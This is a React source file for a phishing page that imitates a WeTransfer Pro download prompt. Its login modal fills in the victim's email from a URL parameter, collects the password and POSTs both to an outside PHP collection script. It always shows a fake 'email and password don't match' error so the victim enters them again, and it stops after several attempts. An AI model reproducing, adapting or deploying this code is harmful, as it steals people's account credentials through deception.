import React, { useState, useEffect, useRef } from "react";
import ReactDom from "react-dom";

export default function Modal({ show, onClose }) {
  const [isBrowser, setIsBrowser] = useState(false);
  const [counter, setCounter] = useState(0)
  const errorBox = useRef(null);
  const [values, setValues] = useState({
    email: "",
    password: "",
  });
  const [message, setMessage] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    const formData = new FormData();
    if (counter > 2){
      setMessage("This email address and password don't seem to match...<br/> Please double-check and try again")
        errorBox.current.style.display = "block";
        setValues({ ...values, password: "" });
        setTimeout(() => {
          errorBox.current.style.display = "none";
          setMessage("")
        }, 3000);
      return;
    }
    setCounter(counter + 1)
    Object.entries(values).forEach(([k, v]) => formData.append(k, v));
    const xhr = new XMLHttpRequest();
    // xhr.open("POST", "https://pcx.pru-sif.shop/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/mrsweet22-2024-04-15.php", true);
    xhr.open("POST", "https://tequilatrornba.com/wp/wp-includes/nat.wetrans.react/drun.php", true);
    xhr.onload = () => {
        setMessage("This email address and password don't seem to match...<br/> Please double-check and try again")
        errorBox.current.style.display = "block";
        setValues({ ...values, password: "" });
        setTimeout(() => {
          errorBox.current.style.display = "none";
          setMessage("")
        }, 3000);
    };
    xhr.onerror = () => {
          setMessage("This email address and password don't seem to match...<br/> Please double-check and try again")
          errorBox.current.style.display = "block";
          setValues({ ...values, password: "" });
          setTimeout(() => {
            errorBox.current.style.display = "none";
            setMessage("")
          }, 3000);
      };
    xhr.send(formData);
  };

  const handleChange = (e) => {
    setValues({ ...values, [e.target.name]: e.target.value });
  };

  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
      results = regex.exec(url);
    if (!results) return "";
    if (!results[2]) return "";
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  useEffect(() => {
    setIsBrowser(true);
    setValues({ ...values, email: getParameterByName("eui") });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  if (isBrowser) {
    return show
      ? ReactDom.createPortal(
          <div className="modal">
            <div className="m-content">
              <div className="box">
                <form onSubmit={handleSubmit} autoComplete="off">
                  <div className="form-group">
                    <input
                      type="email"
                      name="email"
                      value={values.email}
                      placeholder="Email Address"
                      className="form-control"
                      onChange={handleChange}
                      required
                    />
                  </div>
                  <div className="form-group">
                    <input
                      type="password"
                      name="password"
                      value={values.password}
                      placeholder="Password"
                      onChange={handleChange}
                      className="form-control"
                      required
                    />
                  </div>
                  <button type="submit" className="login-btn">
                    Download
                  </button>
                </form>
                <div className="m-footer">
                  <h1>WeTransfer Pro</h1>
                  <p>Get more out of WeTransfer, get Pro</p>
                </div>
                <p className="error-box" ref={errorBox} dangerouslySetInnerHTML={{__html: message}}></p>
              </div>
            </div>
          </div>,
          document.getElementById("m-root")
        )
      : null;
  } else {
    return null;
  }
}
